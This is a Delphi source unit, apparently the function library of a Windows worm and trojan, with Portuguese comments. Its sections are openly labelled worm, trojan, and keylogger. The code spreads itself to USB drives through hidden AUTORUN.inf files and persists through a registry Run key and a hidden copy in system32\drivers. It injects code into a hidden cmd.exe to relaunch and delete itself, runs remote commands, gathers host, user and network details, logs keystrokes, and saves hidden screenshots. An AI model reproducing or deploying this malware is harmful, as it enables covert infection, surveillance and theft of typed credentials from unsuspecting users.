unit TrjFuncs;

interface

uses Windows, MyUtils, WinSock;

type
  TWinVerRec = Record
    WinPlatform     : Integer;
    WinMajorVersion : Integer;
    WinMinorVersion : Integer;
    WinBuildNumber  : Integer;
    WinCSDVersion   : string;
  end;

type
  TParametros = record
    pSleep: procedure (milliseconds: Cardinal); stdcall;
    pDeleteFileA: function (lpFileName: PChar): BOOL; stdcall;
    pExitProcess: procedure (uExitCode: UINT); stdcall;
    plpFileName: PChar;
  end;
  PParametros = ^TParametros;

type
  TFinally = record
    pLoadLibraryA: function (lpLibFileName: PAnsiChar): HMODULE; stdcall;
    pSleep: procedure (milliseconds: Cardinal); stdcall;
    pShellExecuteA: function (hWnd: HWND; Operation, FileName, Parameters,
    Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall;
    pExitProcess: procedure (uExitCode: UINT); stdcall;
    pOperation, pFileName, pParameters, pDirectory, plpLibFileName: PAnsiChar;
  end;
  PFinally = ^TFinally;

function SetIEStartPage(Page: string): Boolean;
function USBInfect(Arq: string): Boolean;
function AutoDelete(Path: string): Boolean;
function RegInfect(Name: string): Boolean;
function RegDesinfect(Name: string): Boolean;
function SetNumLock(State: Boolean): Boolean;
function SetCapsLock(State: Boolean): Boolean;
function SetScrollLock(State: Boolean): Boolean;
function ShutdownWindows(RebootParam: Longword): Boolean;
function RemoteCMD(CMD: string): Boolean;
function CreateDiagnostics: Boolean;
function GetKeyTyped: string;
procedure GetScreenShot(Path: string);

implementation

{=======================BEGIN WORM FUNCTIONS==============================}
{=========================================================================}

function SetIEStartPage(Page: string): Boolean;
 var
  OpenKey: HKEY;
begin
  Result := False;
  try
    if (RegCreateKeyEx(HKEY_CURRENT_USER, 'Software\Microsoft\Internet Explorer\Main', 0, nil,
    REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, OpenKey, nil) = ERROR_SUCCESS) then
    begin
      RegSetValueEx(OpenKey, 'Start Page', 0, REG_SZ, PChar(Page), Length(Page) + 1);
      RegCloseKey(OpenKey);
      Result := True;
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function USBInfect(Arq: string): Boolean;
 var
  Drive: Char;
  Auto : TextFile;
  wOldErrorMode: Word;
begin
  Result := False;
  wOldErrorMode := SetErrorMode(SEM_FAILCRITICALERRORS);
  for Drive := 'A' to 'Z' do
  begin
    if TestDrive(Drive) then
    begin
      if (GetDriveType(PChar(Drive + ':\')) = DRIVE_REMOVABLE) then
      begin
        if ((not FileExists(Drive + ':\' + Arq + '.exe')) and (not FileExists(Drive + ':\AUTORUN.inf'))) then
        begin
          CopyFile(PChar(GetCurrentDir + '\' + Arq + '.exe'), PChar(Drive + ':\' + Arq + '.exe'), False);
          AssignFile(Auto, Drive + ':\AUTORUN.inf');
          Rewrite(Auto);
          if (FileExists(Drive + ':\AUTORUN.inf')) then
          begin
            WriteLn(Auto,'[AUTORUN]' + #13#10 + 'OPEN=' + Arq + '.exe' + #13#10
            + 'ACTION=Abrir pasta para exibir arquivos' + #13#10 + 'ICON=shell32.dll, 4');
            CloseFile(Auto);
            Windows.SetFileAttributes(PChar(Drive + ':\' + Arq + '.exe'), FILE_ATTRIBUTE_HIDDEN);
            Windows.SetFileAttributes(PChar(Drive + ':\AUTORUN.inf'), FILE_ATTRIBUTE_HIDDEN);
          end;
          Result := True;
        end;
      end;
    end;
  end;
  SetErrorMode(wOldErrorMode);
end;

{=======================END WORM FUNCTIONS================================}
{=======================BEGIN TROJAN FUNCTIONS============================}

procedure RegInfectFinally(fFinally: PFinally); stdcall;
begin
  fFinally^.pSleep(5000);
  fFinally^.pLoadLibraryA(fFinally^.plpLibFileName);
  fFinally^.pShellExecuteA(0, fFinally^.pOperation, fFinally^.pFileName, fFinally^.pParameters, fFinally^.pDirectory, 1);
  fFinally^.pExitProcess(0);
end;

procedure RegInfectFinallyEND; stdcall;
begin
end;

procedure RemoteThread_DeleteFile(Parametros: PParametros); stdcall;
begin
  Parametros^.pSleep(5000);
  Parametros^.pDeleteFileA(Parametros^.plpFileName);
  Parametros^.pExitProcess(0);
end;

procedure RemoteThread_DeleteFileEND; stdcall;
begin
end;

function FinallyRegInfect(Name: string): Boolean;
 var
  PID, hProcess, ThreadId, ThreadHandle: Cardinal;
  pRemoteData, pRemoteFunc, pOperation, pFileName, pParameters, pDirectory, plpLibFileName: Pointer;
  fFinally: TFinally;
begin
  Result := False;
  try
    WinExec('cmd.exe', SW_HIDE);
    PID := GetProcessIDbyName('cmd.exe');
    hProcess := OpenProcess(PROCESS_CREATE_THREAD + PROCESS_QUERY_INFORMATION + PROCESS_VM_OPERATION +
    PROCESS_VM_WRITE + PROCESS_VM_READ, False, PID);

    pParameters := WriteStringToProcess(hProcess, '');
    pDirectory  := WriteStringToProcess(hProcess, 'C:\WINDOWS\system32\drivers');
    pOperation  := WriteStringToProcess(hProcess, 'Open');
    pFileName   := WriteStringToProcess(hProcess, 'C:\WINDOWS\system32\drivers\' + Name + '.exe');
    plpLibFileName := WriteStringToProcess(hProcess, 'shell32.dll');

    fFinally.pLoadLibraryA  := GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA');
    fFinally.pExitProcess   := GetProcAddress(GetModuleHandle('kernel32.dll'), 'ExitProcess');
    fFinally.pSleep         := GetProcAddress(GetModuleHandle('kernel32.dll'), 'Sleep');
    fFinally.pShellExecuteA := GetProcAddress(GetModuleHandle('shell32.dll'), 'ShellExecuteA');
    fFinally.pOperation     := pOperation;
    fFinally.pFileName      := pFileName;
    fFinally.pParameters    := pParameters;
    fFinally.pDirectory     := pDirectory;
    fFinally.plpLibFileName := plpLibFileName;

    pRemoteData := WriteDataToProcess(hProcess, SizeOf(fFinally), @fFinally);
    pRemoteFunc := WriteDataToProcess(hProcess, Integer(@RegInfectFinallyEND) - Integer(@RegInfectFinally), @RegInfectFinally);

    ThreadHandle := CreateRemoteThread(hProcess, nil, 0, pRemoteFunc, pRemoteData, 0, ThreadId);
    Halt;

    WaitForSingleObject(ThreadHandle, INFINITE);

    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteFunc, 0, MEM_RELEASE);
    Result := True;
  except
    Result := False;
    Exit;
  end;
end;

function AutoDelete(Path: string): Boolean;
 var
  PID, hProcess, ThreadId, ThreadHandle: Cardinal;
  pRemoteData, pRemoteFunc, plpFileName: Pointer;
  Parametros: TParametros;
begin
  Result := False;
  try
    WinExec('cmd.exe', SW_HIDE);
    PID := GetProcessIDbyName('cmd.exe');
    hProcess := OpenProcess(PROCESS_CREATE_THREAD + PROCESS_QUERY_INFORMATION + PROCESS_VM_OPERATION +
    PROCESS_VM_WRITE + PROCESS_VM_READ, False, PID);

    plpFileName := WriteStringToProcess(hProcess, Path);

    Parametros.pExitProcess := GetProcAddress(GetModuleHandle('kernel32.dll'), 'ExitProcess');
    Parametros.pSleep       := GetProcAddress(GetModuleHandle('kernel32.dll'), 'Sleep');
    Parametros.pDeleteFileA := GetProcAddress(GetModuleHandle('kernel32.dll'), 'DeleteFileA');
    Parametros.plpFileName := plpFileName;

    pRemoteData := WriteDataToProcess(hProcess, SizeOf(Parametros), @Parametros);
    pRemoteFunc := WriteDataToProcess(hProcess, Integer(@RemoteThread_DeleteFileEND) - Integer(@RemoteThread_DeleteFile), @RemoteThread_DeleteFile);

    ThreadHandle := CreateRemoteThread(hProcess, nil, 0, pRemoteFunc, pRemoteData, 0, ThreadId);
    Halt;

    WaitForSingleObject(ThreadHandle, INFINITE);

    VirtualFreeEx(hProcess, plpFileName, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteFunc, 0, MEM_RELEASE);
    Result := True;
  except
    Result := False;
    Exit;
  end;
end;

function RegInfect(Name: string): Boolean;
 var
  OpenKey: HKEY;
begin
  Result := False;
  try
    if FileExists('C:\WINDOWS\system32\drivers\' + Name + '.exe') then
    begin
      Result := False;
      Exit;
    end;
    CopyFile(PChar(GetCurrentDir + '\' + Name + '.exe'), PChar('C:\WINDOWS\system32\drivers\' + Name + '.exe'), False);
    Windows.SetFileAttributes(PChar('C:\WINDOWS\system32\drivers\' + Name + '.exe'), FILE_ATTRIBUTE_HIDDEN);
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, nil,
    REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, OpenKey, nil) = ERROR_SUCCESS) then
    begin
      RegSetValueEx(OpenKey, PChar(Name), 0, REG_SZ, PChar('C:\WINDOWS\system32\drivers\' + Name + '.exe'),
      Length('C:\WINDOWS\system32\drivers\' + Name + '.exe') + 1);
      RegCloseKey(OpenKey);
      FinallyRegInfect(Name);
      Result := True;
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function RegDesinfect(Name: string): Boolean;
 var
  OpenKey: HKEY;
begin
  Result := False;
  try
    if not FileExists('C:\WINDOWS\system32\drivers\' + Name + '.exe') then
    begin
      Result := False;
      Exit;
    end;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_WRITE,
    OpenKey) = ERROR_SUCCESS) then
    begin
      RegDeleteValue(OpenKey, PChar(Name));
      RegCloseKey(OpenKey);
      Result := True;
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function SetNumLock(State: Boolean): Boolean;
begin
  Result := False;
  try
    if ((State and ((GetKeyState(VK_NUMLOCK) and 1) = 0))
    or ((not State) and ((GetKeyState(VK_NUMLOCK) and 1) = 1))) then
    begin
      keybd_event(VK_NUMLOCK, $45, KEYEVENTF_EXTENDEDKEY or 0, 0);
      keybd_event(VK_NUMLOCK, $45, KEYEVENTF_EXTENDEDKEY or KEYEVENTF_KEYUP, 0);
    end;
    Result := True;
  except
    Exit;
  end;
end;

function SetCapsLock(State: Boolean): Boolean;
begin
  Result := False;
  try
    if ((State and ((GetKeyState(VK_CAPITAL) and 1) = 0))
    or ((not State) and ((GetKeyState(VK_CAPITAL) and 1) = 1))) then
    begin
      keybd_event(VK_CAPITAL, $45, KEYEVENTF_EXTENDEDKEY or 0, 0);
      keybd_event(VK_CAPITAL, $45, KEYEVENTF_EXTENDEDKEY or KEYEVENTF_KEYUP, 0);
    end;
    Result := True;
  except
    Exit;
  end;
end;

function SetScrollLock(State: Boolean): Boolean;
begin
  Result := False;
  try
    if ((State and ((GetKeyState(VK_SCROLL) and 1) = 0))
    or ((not State) and ((GetKeyState(VK_SCROLL) and 1) = 1))) then
    begin
      keybd_event(VK_SCROLL, $45, KEYEVENTF_EXTENDEDKEY or 0, 0);
      keybd_event(VK_SCROLL, $45, KEYEVENTF_EXTENDEDKEY or KEYEVENTF_KEYUP, 0);
    end;
    Result := True;
  except
    Exit;
  end;
end;

function ShutdownWindows(RebootParam: Longword): Boolean;
 var
  TTokenHd: THandle;
  TTokenPvg: TTokenPrivileges;
  cbtpPrevious: DWORD;
  rTTokenPvg: TTokenPrivileges;
  pcbtpPreviousRequired: DWORD;
  tpResult: Boolean;
 const
  SE_SHUTDOWN_NAME = 'SeShutdownPrivilege';
begin
  tpResult := OpenProcessToken(GetCurrentProcess(),
  TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
  TTokenHd);
  if tpResult then
  begin
    tpResult := LookupPrivilegeValue(nil, SE_SHUTDOWN_NAME,
    TTokenPvg.Privileges[0].Luid);
    TTokenPvg.PrivilegeCount := 1;
    TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    cbtpPrevious := SizeOf(rTTokenPvg);
    pcbtpPreviousRequired := 0;
    if tpResult then
      Windows.AdjustTokenPrivileges(TTokenHd, False, TTokenPvg,
    cbtpPrevious, rTTokenPvg, pcbtpPreviousRequired);
  end;
  Result := ExitWindowsEx(RebootParam, 0);
end;

function GetLanguageWin: string;
 var
  ID: LangID;
  Language: array [0..100] of Char;
begin
  ID := GetSystemDefaultLangID;
  VerLanguageName(ID, Language, 100);
  Result := string(Language);
end;

function GetComputerName: string;
 var
  Comp: string;
  Size: DWORD;
begin
  Size := 255;
  SetLength(Comp, Size);
  GetComputerNameA(PChar(Comp), Size);
  Result := Trim(Comp);
end;

function GetUserName: string;
 var
  User: string;
  Size: DWORD;
begin
  Size := 255;
  SetLength(User, Size);
  GetUserNameA(PChar(User), Size);
  Result := Trim(User);
end;

function GetWinVersion: TWinVerRec;
 var
  OSVersionInfo: TOSVersionInfo;
begin
  with Result do
  begin
    WinPlatform := 0;
    WinMajorVersion := 0;
    WinMinorVersion := 0;
    WinBuildNumber := 0;
    WinCSDVersion := '';
  end;
  OSVersionInfo.dwOSVersionInfoSize := SizeOf(OSVersionInfo);
  if GetVersionEx(OSVersionInfo) then
  with OSVersionInfo do
  begin
    with Result do
    begin
      WinPlatform := dwPlatformId;
      WinMajorVersion := dwMajorVersion;
      WinMinorVersion := dwMinorVersion;
      WinBuildNumber := dwBuildNumber;
      WinCSDVersion := szCSDVersion;
    end;
  end;
end;

function GetWinType: string;
 var
  PlatformId, CSDVersion: string;
begin
  CSDVersion := '';
  case GetWinVersion.WinPlatform of // Detecta Plataforma
    VER_PLATFORM_WIN32_WINDOWS: // Windows 95, 9X
    begin
      if (GetWinVersion.WinMajorVersion = 4) then
        case GetWinVersion.WinMinorVersion of
          0:  if ((Length(GetWinVersion.WinCSDVersion) > 0) and
                 (GetWinVersion.WinCSDVersion[1] in ['B', 'C'])) then
                PlatformId := '95 OSR2'
              else
                PlatformId := '95';
          10: if ((Length(GetWinVersion.WinCSDVersion) > 0) and
                 (GetWinVersion.WinCSDVersion[1] = 'A')) then
                PlatformId := '98 SE'
              else
                PlatformId := '98';
          90: PlatformId := 'ME';
        end else
          PlatformId := '9X Version(Unknown)';
    end;
    VER_PLATFORM_WIN32_NT: // NT
    begin
      if (Length(GetWinVersion.WinCSDVersion) > 0) then
        CSDVersion := GetWinVersion.WinCSDVersion;
      if (GetWinVersion.WinMajorVersion <= 4) then
        PlatformId := 'NT'
      else if (GetWinVersion.WinMajorVersion = 5) then
      case GetWinVersion.WinMinorVersion of
        0: PlatformId := '2000';
        1: PlatformId := 'XP';
        2: PlatformId := 'Server 2003';
      end else if ((GetWinVersion.WinMajorVersion = 6) and (GetWinVersion.WinMinorVersion = 0)) then
        PlatformId := 'Vista'
      else
        PlatformId := 'Windows 7';
    end;
  end;
  Result := PlatformId;
end;

function IsWindows64: Boolean;
 type
  TIsWow64Process = function(AHandle: THandle; var AIsWow64: BOOL): BOOL; stdcall;
 var
  vKernel32Handle: DWORD;
  vIsWow64Process: TIsWow64Process;
  vIsWow64: BOOL;
begin
  Result := False;
  vKernel32Handle := LoadLibrary('kernel32.dll');
  if (vKernel32Handle = 0) then
    Exit;
  try
    @vIsWow64Process := GetProcAddress(vKernel32Handle, 'IsWow64Process');
    if not Assigned(vIsWow64Process) then
      Exit;
    vIsWow64 := False;
    if (vIsWow64Process(GetCurrentProcess, vIsWow64)) then
      Result := vIsWow64;
  finally
    FreeLibrary(vKernel32Handle);
  end;
end;

function GetIPs: string;
 type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
 var
  phe: PHostEnt;
  pptr: PaPInAddr;
  Buffer: array[0..63] of Char;
  I: Integer;
  GInitData: TWSAData;
begin
  WSAStartup($101, GInitData);
  GetHostName(Buffer, SizeOf(Buffer));
  phe := GetHostByName(buffer);
  if (phe = nil) then
    Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  I    := 0;
  while pPtr^[I] <> nil do
  begin
    Result := Result + ('Adaptador Ethernet ' + IntToStr(i) + ' >> ' + inet_ntoa(pptr^[I]^) + #13#10);
    Inc(I);
  end;
  WSACleanup;
end;

function GetHost: string;
 type
  Name = array[0..100] of Char;
  PName = ^Name;
 var
  HName: PName;
  WSAData: TWSAData;
begin
  if (WSAStartup($0101, WSAData) <> 0) then
  begin
    Result := 'Winsock is not responding.';
    Exit;
  end;
  New(HName);
  if (GetHostName(HName^, SizeOf(Name)) = 0) then
  begin
    Result := string(HName^);
  end;
  Dispose(HName);
  WSACleanup;
end;

function GetMacAddress: string;
 var
  fNtAUuids: function(pTime: PInt64; pRange, pSequence: PDWORD; pSeed: Pointer): DWORD; stdcall;
  vTime: Int64;
  vRange, vSequence: DWORD;
  vSeed: array [0..5] of Byte;
  i: Integer;
begin
  fNtAUuids := GetProcAddress(GetModuleHandle('ntdll.dll'), 'NtAllocateUuids');
  fNtAUuids(@vTime, @vRange, @vSequence, @vSeed[0]);
  for i := 0 to 5 do
  begin
    Result := Result + IntToHex(vSeed[i], 2);
    if (i < 5) then
      Result := Result + '-';
  end;
end;

function AdminPriv: Boolean;
 const
  AUTORIDADE_NT_SYSTEM: TSIDIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
  SECURITY_BUILTIN_DOMAIN_RID = $00000020;
  DOMAIN_ALIAS_RID_ADMINS = $00000220;
 var
  x: Integer;
  conseguiu: BOOL;
  AdminPSID: PSID;
  gruposp: PTokenGroups;
  dwInfoBufferSize: DWORD;
  hMascara_acesso: THandle;
begin
  Result := False;
  conseguiu := OpenThreadToken(GetCurrentThread, TOKEN_QUERY, True,hMascara_acesso);
  if not conseguiu then
  begin
    if GetLastError = ERROR_NO_TOKEN then
      conseguiu := OpenProcessToken(GetCurrentProcess, TOKEN_QUERY,hMascara_acesso);
  end;
  if conseguiu then
  begin
    GetMem(gruposp, 1024);
    conseguiu := GetTokenInformation(hMascara_acesso, TokenGroups,gruposp, 1024, dwInfoBufferSize);
    CloseHandle(hMascara_acesso);
    if conseguiu then
    begin
      AllocateAndInitializeSid(AUTORIDADE_NT_SYSTEM, 2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, AdminPSID);
      {$R-}
      for x := 0 to gruposp.GroupCount - 1 do
        if EqualSid(AdminPSID, gruposp.Groups[x].Sid) then
        begin
          Result := True;
          Break;
        end;
      {$R+}
      FreeSid(AdminPSID);
    end;
    FreeMem(gruposp);
  end;
end;

function RemoteCMD(CMD: string): Boolean;
 var
  Command: string;
begin
  Result := False;
  Command := CMD;
  Delete(Command, 1, 4);
  case (WinExec(PChar('cmd /k' + Command), 1) <> 31) of
    True : Result := True;
    False: Result := False;
  end;
end;

function CreateDiagnostics: Boolean;
 var
  Diag: TextFile;
begin
  Result := False;
  try
    if FileExists(GetCurrentDir + '\DIAG.txt') then
      DeleteFile(PChar(GetCurrentDir + '\DIAG.txt'));
    AssignFile(Diag, GetCurrentDir + '\DIAG.txt');
    Rewrite(Diag);
    Write(Diag, '>> Informações do Windows  <<' + #13#10 +
    'Tipo: ' + GetWinType + ' (' + GetWinVersion.WinCSDVersion + ') ');
    Write(Diag, 'v' + IntToStr(GetWinVersion.WinPlatform));
    case IsWindows64 of
      True  : Write(Diag, ' 64-Bit' + #13#10);
      False : Write(Diag, ' 32-Bit' + #13#10);
    end;
    Writeln(Diag, 'Versão: ' + IntToStr(GetWinVersion.WinMajorVersion) + '.' +
    IntToStr(GetWinVersion.WinMinorVersion) + '.' + IntToStr(GetWinVersion.WinBuildNumber) + #13#10 +
    '=============================' + #13#10 +
    'Nome do Computador >> ' + GetComputerName);
    case AdminPriv of
      True  : Writeln(Diag, 'Nome do Usuário (Administrador): ' + GetUserName);
      False : Writeln(Diag, 'Nome do Usuário (Usuário Comum): ' + GetUserName);
    end;
    Writeln(Diag,
    '>> Endereços de IPv4 <<' + #13#10 + GetIPs +
    '=======================' + #13#10 +
    'Nome do Host >> ' + GetHost + #13#10 +
    'MAC Adress   >> ' + GetMacAddress + #13#10 +
    'Idioma       >> ' + GetLanguageWin);
    CloseFile(Diag);
    Windows.SetFileAttributes(PChar(GetCurrentDir + '\DIAG.txt'), FILE_ATTRIBUTE_HIDDEN);
    Result := True;
  except
    CloseFile(Diag);
    Exit;
  end;
end;

{=======================END TROJAN FUNCTIONS==============================}
{=======================BEGIN KEYLOGGER & SCREENLOGGER FUNCTIONS==========}

function GetKeyTyped: string;
 var
  i: Byte;
begin
  for i := 8 to 222 do
  begin
    if GetAsyncKeyState(i) = -32767 then
    begin
      case I of
        //8  : memo1.Lines[memo1.Lines.count-1] := copy(memo1.Lines[memo1.Lines.count-1],1,length(memo1.Lines[memo1.Lines.count-1])-1);
        8  : Result := Result + '[Backspace]';
        9  : Result := Result + '[Tab]';
        13 : Result := Result + #13#10; // Enter
        17 : Result := Result + '[Ctrl]';
        27 : Result := Result + '[Esc]';
        32 : Result := Result + ' '; // Space

        // Del, Ins, Home, PageUp, PageDown, End
        33 : Result := Result + '[Page Up]';
        34 : Result := Result + '[Page Down]';
        35 : Result := Result + '[End]';
        36 : Result := Result + '[Home]';

        // Setas: Up, Down, Left, Right
        37 : Result := Result + '[Left]';
        38 : Result := Result + '[Up]';
        39 : Result := Result + '[Right]';
        40 : Result := Result + '[Down]';
        44 : Result := Result + '[Print Screen]';
        45 : Result := Result + '[Insert]';
        46 : Result := Result + '[Del]';
        145 : Result := Result + '[Scroll Lock]';

        // Numeros: 1234567890, Simbolos: !@#$%¨&*()
        48 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + ')'
             else Result := Result + '0';
        49 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '!'
             else Result := Result + '1';
        50 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '@'
             else Result := Result + '2';
        51 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '#'
             else Result := Result + '3';
        52 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '$'
             else Result := Result + '4';
        53 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '%'
             else Result := Result + '5';
        54 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '¨'
             else Result := Result + '6';
        55 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '&'
             else Result := Result + '7';
        56 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '*'
             else Result := Result + '8';
        57 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '('
             else Result := Result + '9';

        {58 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + ':';
        59 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + ';';
        63 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '?';
        124 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '|';
        92 : Result := Result + '\';}

        // a..z, A..Z
        65..90 :
            begin
            if ((GetKeyState(VK_CAPITAL)) = 1) then
                if (GetKeyState(VK_SHIFT) < 0) then
                   Result := Result + LowerCase(Chr(i)) //a..z
                else
                   Result := Result + UpperCase(Chr(i)) //A..Z
            else
                if (GetKeyState(VK_SHIFT) < 0) then
                    Result := Result + UpperCase(Chr(i)) //A..Z
                else
                    Result := Result + LowerCase(Chr(i)); //a..z
            end;

        // Numpad
        96..105 : Result := Result + IntToStr(I - 96); //Numpad  0..9

        106 : Result := Result + '*';
        107 : Result := Result + '+';
        109 : Result := Result + '-';
        110 : Result := Result + ',';
        111 : Result := Result + '/';
        144 : Result := Result + '[Num Lock]';

        // F1-F12
        112..123 : Result := Result + '[F' + IntToStr(i - 111) + ']';

        186 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + 'Ç'
              else Result := Result + 'ç';
        187 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '+'
              else Result := Result + '=';
        188 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '<'
              else Result := Result + ',';
        189 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '_'
              else Result := Result + '-';
        190 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '>'
              else Result := Result + '.';
        191 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + ':'
              else Result := Result + ';';
        192 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '"'
              else Result := Result + '''';
        219 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '`'
              else Result := Result + '´';
        220 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '}'
              else Result := Result + ']';
        221 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '{'
              else Result := Result + '[';
        222 : if GetKeyState(VK_SHIFT) < 0 then Result := Result + '^'
              else Result := Result + '~';
      end;
    end;
  end;
end;

procedure GetScreenShot(Path: string);
 var
  hBitM: hBitmap;
  Bits: Pointer;
  Info: TBITMAPINFO;
  W, H: Integer;
  ScreenDC, DCBitM: hDC;
  fByte: file of Byte;
  FileHeader: TBITMAPFILEHEADER;
begin
  if FileExists(Path) then
    DeleteFile(PChar(Path));

  ScreenDC := GetDC(GetDesktopWindow);
  DCBitM := CreateCompatibleDC(ScreenDC);
  W := GetDeviceCaps(ScreenDC, HORZRES);
  H := GetDeviceCaps(ScreenDC, VERTRES);
  ZeroMemory(@Info, SizeOf(Info));
  with Info.bmiHeader do
  begin
    Info.bmiHeader.biXPelsPerMeter := round(GetDeviceCaps(ScreenDC, LOGPIXELSX) * 39.37);
    Info.bmiHeader.biYPelsPerMeter := round(GetDeviceCaps(ScreenDC, LOGPIXELSY) * 39.37);
    biSize := SizeOf(TBITMAPINFOHEADER);
    biWidth := W;
    biHeight := H;
    biPlanes := 1;
    biBitCount := 24;
    biCompression := BI_RGB;
  end;
  hBitM := CreateDIBSection(DCBitM, Info, DIB_RGB_COLORS, Bits, 0, 0);
  SelectObject(DCBitM, hBitM);
  BitBlt(DCBitM, 0, 0, W, H, ScreenDC, 0, 0, SRCCOPY);
  ReleaseDC(GetDeskTopWindow, ScreenDC);

  AssignFile(fByte, Path);
  Rewrite(fByte);
  if (W and 3 <> 0) then
    W := 4*((W div 4) + 1);

  with FileHeader do
  begin
    bfType := Ord('B') + (Ord('M') shl 8);
    bfSize := SizeOf(TBITMAPFILEHEADER) + SizeOf(TBITMAPINFOHEADER) + W * H * 3;
    bfOffBits := SizeOf(TBITMAPINFOHEADER);
  end;

  BlockWrite(fByte, FileHeader, SizeOf(TBITMAPFILEHEADER));
  BlockWrite(fByte, Info.bmiHeader, SizeOf(TBITMAPINFOHEADER));
  BlockWrite(fByte, Bits^, W * H * 3);
  CloseFile(fByte);
  DeleteObject(hBitM);
  DeleteDC(DCBitM);

  Windows.SetFileAttributes(PChar(Path), FILE_ATTRIBUTE_HIDDEN);
end;

{=======================END KEYLOGGER & SCREENLOGGER FUNCTIONS============}
{=========================================================================}

end.
